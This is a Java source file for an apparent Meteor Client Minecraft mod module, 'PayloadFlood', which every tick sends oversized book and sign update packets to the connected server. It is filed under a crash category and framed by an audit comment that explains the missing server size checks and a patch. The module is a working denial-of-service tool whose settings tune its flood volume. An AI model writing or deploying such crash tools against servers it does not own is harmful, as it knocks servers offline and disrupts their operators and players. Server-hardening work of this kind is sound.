package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.util.math.BlockPos;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

/**
 * AUDIT: Payload Flood (oversized book and sign payloads)
 *
 * Alternates BookUpdateC2SPacket (up to 200 pages × 32767 chars per page)
 * and UpdateSignC2SPacket (4 lines × 32767 chars). Each represents a
 * different parsing path with its own size limits, so both must be validated
 * independently.
 *
 * Book payload: a 200-page book at max page length is ~6.5 MB of text per
 * packet. Without a size cap at decode time, parsing allocates large String
 * objects before any permission or rate-limit check runs.
 *
 * Sign payload: each sign line is typically capped at 384 chars in vanilla
 * but servers may raise or forget the limit. A line at 32767 chars is ~64 KB
 * per packet — sent at 20/s that is ~1.3 MB/s of string allocation per player
 * per tick just for sign updates.
 *
 * Patch signal: enforce max page count, max page/title byte length, and max
 * sign line length at decode time before any business logic or string
 * allocation; reject over-limit payloads with a disconnect, not after parsing.
 *
 * Run against your OWN local server only.
 */
public class PayloadFlood extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> pagesPerPacket = sgGeneral.add(new IntSetting.Builder()
        .name("pages-per-packet").description("Book pages per packet.")
        .defaultValue(100).range(1, 200).sliderRange(1, 200).build()
    );
    private final Setting<Integer> pageSize = sgGeneral.add(new IntSetting.Builder()
        .name("page-size").description("Characters per book page.")
        .defaultValue(32767).range(1, 32767).sliderRange(100, 32767).build()
    );
    private final Setting<Integer> lineSize = sgGeneral.add(new IntSetting.Builder()
        .name("sign-line-size").description("Characters per sign line.")
        .defaultValue(32767).range(1, 32767).sliderRange(384, 32767).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    private boolean bookTurn = true;

    public PayloadFlood() {
        super(AddonTemplate.CRASH_CATEGORY, "payload-flood",
            "Alternates oversized book and sign packets. Stress-tests server payload size limits.");
    }

    @Override
    public void onActivate() { bookTurn = true; }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        if (bookTurn) sendBook(); else sendSign();
        bookTurn = !bookTurn;
    }

    private void sendBook() {
        String page = "A".repeat(pageSize.get());
        List<String> pages = new ArrayList<>();
        for (int i = 0; i < pagesPerPacket.get(); i++) pages.add(page);
        mc.player.networkHandler.sendPacket(new BookUpdateC2SPacket(
            mc.player.getInventory().getSelectedSlot(), pages, Optional.empty()));
            packetsSent++;
    }

    private void sendSign() {
        String line = "S".repeat(lineSize.get());
        mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
            BlockPos.ORIGIN, true, line, line, line, line));
            packetsSent++;
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
